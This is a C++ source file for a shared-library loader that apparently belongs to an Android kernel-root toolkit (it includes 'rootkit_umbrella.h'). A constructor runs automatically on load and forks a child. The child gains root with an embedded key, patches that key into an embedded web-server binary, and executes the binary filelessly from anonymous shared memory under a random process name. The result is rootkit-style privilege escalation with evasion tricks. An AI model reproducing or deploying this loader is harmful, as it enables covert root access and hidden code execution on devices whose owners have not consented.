#include <unistd.h>
#include <iostream>
#include <string>
#include <random>
#include <array>
#include <cerrno>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#include "common/file_replace_string.h"
#include "common/random_data.h"
#include "rootkit_umbrella.h"
#include "shm_open_anon.h"
#include "lib_web_server_loader_inline.h"
#include "web_server\web_server_data.generated.h"
#include "web_server\web_server_inline.h"

char ROOT_KEY[256] = {0};

extern char** environ;

static std::string make_rand_progname() {
    static constexpr std::string_view kChars =
        "0123456789"
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        ".";
    thread_local std::mt19937 rng{[]{
        std::random_device rd;
        return std::mt19937{static_cast<uint32_t>(
            (static_cast<uint64_t>(rd()) << 32) ^ static_cast<uint32_t>(::getpid()) ^ static_cast<uint32_t>(::time(nullptr))
        )};
    }()};

    std::uniform_int_distribution<int> len_dist(1, 16);
    std::uniform_int_distribution<size_t> idx_dist(0, kChars.size() - 1);

    const int len = len_dist(rng);
    std::string s;
    s.resize(static_cast<size_t>(len));
    for (int i = 0; i < len; ++i) {
        s[static_cast<size_t>(i)] = kChars[idx_dist(rng)];
    }
    return s;
}

static int fexecve_compat(int fd, char* const argv[], char* const envp[]) {
#ifdef __NR_execveat
    if (syscall(__NR_execveat, fd, "", argv, envp, AT_EMPTY_PATH) == 0) {
        return 0;
    }
#endif
    char path[64];
    int n = snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    if (n <= 0 || n >= (int)sizeof(path)) {
        errno = ENAMETOOLONG;
        return -1;
    }
    return execve(path, argv, envp);
}

static int my_fexecve(int fd, char* const argv[], char* const envp[]) {
#if defined(__BIONIC__) && __ANDROID_API__ >= 28
    return fexecve(fd, argv, envp);
#else
    return fexecve_compat(fd, argv, envp);
#endif
}

static int memfd_from_blob(const void* blob, size_t len) {
    int fd = shm_open_anon();
    if (fd < 0) return -1;
    if (ftruncate(fd, (off_t)len) != 0) { close(fd); return -1; }
    void* p = mmap(nullptr, len, PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) { close(fd); return -1; }
    memcpy(p, blob, len);
    munmap(p, len);
    return fd;
}

static int exec_from_blob_noargs(const void* blob, size_t len) {
    int fd = memfd_from_blob(blob, len);
    if (fd < 0) return -1;

	std::string prog = make_rand_progname();
    char* argv[] = { prog.data(), nullptr };
    my_fexecve(fd, argv, environ);
    int err = errno;
    close(fd);
    return err;
}

static inline void printf_random_data() {
    if(time(NULL) == 0) {
        for(size_t i = 0; i < random_bin::random_size; i++) {
            const char* c = reinterpret_cast<const char*>(random_bin::random_data);
            std::cout << c[i];
        }
    }
}

extern "C" void __attribute__((constructor)) lib_web_server_loader_entry() {
    strncpy(ROOT_KEY, const_cast<char*>(static_inline_lib_web_server_loader_root_key), sizeof(ROOT_KEY) - 1);
    pid_t pid = fork();
    if (pid == 0) {
        kernel_root::get_root(ROOT_KEY);

        // write root key
        if(replace_feature_string_in_buf(const_cast<char*>(static_inline_web_server_root_key), sizeof(static_inline_web_server_root_key), 
            ROOT_KEY, (char*)&kernel_root::web_server_file_data[0], kernel_root::web_server_file_size)) {
            exec_from_blob_noargs(kernel_root::web_server_file_data, kernel_root::web_server_file_size);
        }
        _exit(0);
        printf_random_data();
    }
}
